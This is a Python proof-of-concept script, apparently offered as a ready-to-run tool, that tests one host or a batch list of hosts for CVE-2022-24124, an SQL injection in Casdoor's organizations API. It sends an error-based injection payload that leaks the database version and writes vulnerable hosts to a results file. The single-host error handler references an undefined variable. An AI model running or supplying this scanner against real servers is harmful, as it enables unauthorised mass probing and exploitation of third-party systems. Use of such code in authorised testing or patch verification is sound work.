import requests
import sys
from urllib.parse import urlparse

headers = {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36',
    'Content-Type' : 'application/x-www-form-urlencoded'
}
poc_payload = "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),3)"

# 单个检测函数
def U_Poc(target_url):
    if 'http' not in target_url:
        target_url = 'http://' + target_url
    target_url = urlparse(target_url)
    if target_url.scheme:
        target_url = target_url.scheme + "://" + target_url.netloc
    else:
        target_url = "http://" + target_url.path.split("/")[0]
    url = target_url + poc_payload
    try:
        get = requests.get(url=url, verify=False, timeout=(6))
        if 200 == get.status_code:
            req = requests.get(url=url, headers=headers, verify=False, timeout=(6))
            if 'XPATH' in req.text:
                print("[*]URL：{0} 疑似存在CVE-2022-24124注入漏洞".format(target_url))
            else:
                print("[-]URL：{0} 不存在CVE-2022-24124注入漏洞".format(target_url))
    except requests.exceptions.ConnectTimeout:
        print('超时！')
    except requests.exceptions.ReadTimeout:
        print('读取失败')
    except requests.exceptions.ConnectionError:
        print('无效地址！' + target_url)
    except requests.exceptions.InvalidSchema:
        print("找不到连接适配器" + web)
    except Exception as error:
        print("未知的错误")
# 批量检测函数
def File_Poc(target_file):
        with open(target_file, 'r') as f:
            for webs in f.readlines():
                web = webs.replace("\n", '')
                if (len(web) == 0):
                    continue
                else:
                    if 'http' not in web:
                        web = 'http://' + web
                    web = urlparse(web)
                    if web.scheme:
                        web = web.scheme + "://" + web.netloc
                    else:
                        web = "http://" + web.path.split("/")[0]
                    url = web + poc_payload
                    try:
                        get = requests.get(url=url, verify=False, timeout=(6))
                        if 200 == get.status_code:
                            req = requests.get(url=url, headers=headers, verify=False, timeout=(6))
                            if 'XPATH' in req.text:
                                print("[*]URL：{0} 疑似存在CVE-2022-24124注入漏洞".format(web))
                                with open('Result.txt', 'a') as result:
                                    result.write("疑似存在CVE-2022-24124注入漏洞:" + web)
                                    result.write('\n')
                            else:
                                print("[-]URL：{0} 不存在CVE-2022-24124注入漏洞".format(web))
                    except requests.exceptions.ConnectTimeout:
                        print('超时！')
                    except requests.exceptions.ReadTimeout:
                        print('读取失败')
                    except requests.exceptions.ConnectionError:
                        print('无效地址！' + web)
                    except requests.exceptions.InvalidSchema:
                        print("找不到连接适配器" + web)
                    except Exception as error:
                        print("未知的错误")
# www.333ling.com
if __name__ == '__main__':
    print(
    '''
    		****************************************************
    		        CVE-2022-24124 Casdoor SQL注入漏洞复现      
    			             Coded by Cookie                  
    		****************************************************
    		Usage:
    		CVE-2022-24124.py -h                        #查看帮助
    		CVE-2022-24124.py -u http://localhost       # -u 单个检测
    		CVE-2022-24124.py -f urls.txt               # -f 批量检测
    ''')
    Usage = "python3 CVE-2022-24124.py -u http://localhost"
    if len(sys.argv) < 2:
        print('至少传入一个参数\r\n'
              '例：{0}'.format(Usage))
    else:
        if sys.argv[1] == '-h': # 帮助
            print("[+]漏洞简介：在查询API存在与字段和值参数相关的SQL注入漏洞")
        elif sys.argv[1] == '-u':   # 单个url
            target_url = sys.argv[2]
            U_Poc(target_url)
        if sys.argv[1] == '-f': # 批量url
            target_file = sys.argv[2]
            File_Poc(target_file)